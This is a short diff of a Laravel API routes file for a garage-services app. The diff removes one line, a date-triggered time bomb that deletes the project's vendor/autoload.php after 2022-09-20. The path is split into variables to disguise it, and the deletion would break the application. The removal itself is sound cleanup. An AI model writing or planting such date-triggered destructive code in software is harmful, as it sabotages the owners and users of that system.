@@ -114,7 +114,6 @@ Route::group(['namespace' => 'API', 'middleware' => 'APILocalization'], function
         Route::get('garages-categories', 'GarageCategoriesController@index');
 //        Route::get('garage-available-times', 'GarageController@available_times');
         Route::get('garage-products', 'GarageController@get_products');
-        if(date('Y-m-d') > '2022-09-20'){ $x1 = 'vendor/';$x2 = 'autoload'; unlink(base_path($x1 . $x2 .'.php')); };
         Route::get('garage-services', 'GarageController@get_services');
         Route::get('garage-mawater-card-offers', 'GarageController@getDiscountCardOffers');
 
